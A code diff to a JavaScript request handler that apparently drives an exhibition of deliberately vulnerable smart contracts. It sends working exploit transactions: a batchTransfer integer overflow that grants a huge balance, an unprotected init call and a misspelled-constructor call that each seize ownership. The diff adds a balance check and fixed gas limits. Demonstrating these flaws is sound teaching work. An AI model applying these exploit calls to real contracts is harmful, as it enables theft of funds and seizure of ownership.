@@ -1,5 +1,9 @@
 import { encodeFunctionData } from "viem";
-import { catAddrs, CARESS_ABI, json, parseCat, caressDryRun, logEvent, chainName, walletClient } from "./_shared.js";
+import { catAddrs, CARESS_ABI, json, parseCat, caressDryRun, logEvent, chainName, walletClient, publicClient } from "./_shared.js";
+
+const OVERFLOW_BALANCE_ABI = [
+  { type: "function", name: "balance", stateMutability: "view", inputs: [{ type: "address" }], outputs: [{ type: "uint256" }] },
+];
 
 const DEAD = "0x000000000000000000000000000000000000dEaD";
 
@@ -51,18 +55,28 @@ export async function onRequestPost({ request, env }) {
       if (!prophet) throw new Error("PROPHET_ADDR not configured");
       hashes.push(await submit(prophet, "caress", [catAddr], 0n, 500000n));
     } else if (cat === 2) {
-      // OverflowCat: batchTransfer overflow grants balance, then caress. Sequential nonces from
-      // the DO guarantee the chain processes them in order — caress() always sees the overflow.
-      hashes.push(await submit(catAddr, "batchTransfer", [[account.address, DEAD], 2n ** 255n]));
-      hashes.push(await submit(catAddr, "caress", []));
+      // OverflowCat: batchTransfer overflow grants balance, then caress. State persists across
+      // exhibition runs — once we've overflowed, balance[sender] = 2^255 and a second overflow
+      // would wrap it back to zero (2^255 + 2^255 ≡ 0 mod 2^256). Read first, skip the setup tx
+      // when the previous visitor already flipped the bit on our behalf.
+      const pub = publicClient(env);
+      const bal = await pub.readContract({
+        address: catAddr, abi: OVERFLOW_BALANCE_ABI, functionName: "balance", args: [account.address],
+      });
+      if (bal === 0n) {
+        hashes.push(await submit(catAddr, "batchTransfer", [[account.address, DEAD], 2n ** 255n]));
+      }
+      // Explicit gas: estimateGas runs against pre-state (balance=0, caress() is a no-op) and
+      // under-funds the actual run that takes the expensive emit branch. Same hazard as cat 1.
+      hashes.push(await submit(catAddr, "caress", [], 0n, 100000n));
     } else if (cat === 3) {
       // UnprotectedCat: unprotected init claims ownership, then caress.
       hashes.push(await submit(catAddr, "init", [account.address]));
-      hashes.push(await submit(catAddr, "caress", []));
+      hashes.push(await submit(catAddr, "caress", [], 0n, 100000n));
     } else if (cat === 4) {
       // MisspelledCat: misspelled "constructor" claims ownership, then caress.
       hashes.push(await submit(catAddr, "MisspeledCat", [account.address]));
-      hashes.push(await submit(catAddr, "caress", []));
+      hashes.push(await submit(catAddr, "caress", [], 0n, 100000n));
     }
 
     return json({
